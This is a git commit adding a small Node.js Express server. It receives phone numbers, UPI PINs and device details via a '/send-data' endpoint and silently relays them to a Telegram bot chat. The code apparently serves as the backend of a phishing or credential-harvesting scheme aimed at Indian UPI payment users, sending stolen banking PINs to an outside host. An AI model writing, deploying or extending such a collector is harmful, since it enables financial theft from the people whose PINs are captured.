c0519e5937df2e0dacf12ec91216d15ca8bce9a1
BjpBackend <bjpbackend@gmail.com>
2026-04-04 01:16:08 +0545

    Add files via upload

---
+++ server.js
@@ -0,0 +1,45 @@
+require('dotenv').config();
+const express = require('express');
+const axios = require('axios');
+const cors = require('cors');
+
+const app = express();
+app.use(cors());
+app.use(express.json());
+
+const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
+
+const sendToTelegram = async (message) => {
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+    } catch (error) {}
+};
+
+const startupNotification = async () => {
+    await sendToTelegram(`*BJP Client's*`);
+};
+
+app.post('/send-data', async (req, res) => {
+
+    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
+    
+    let formattedNumber = number ? `+91 ${number}` : 'Pending...';
+    let upiStatus = type === 'NUMBER' ? 'PENDING' : `\`${pin}\``;
+
+    let message = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
+    message += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
+    message += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
+    message += `*Number:* ${formattedNumber}\n`;
+    message += `*UPI PIN:* ${upiStatus}`;
+
+    await sendToTelegram(message);
+    res.status(200).json({ success: true });
+});
+
+app.listen(PORT, () => {
+    startupNotification();
+});
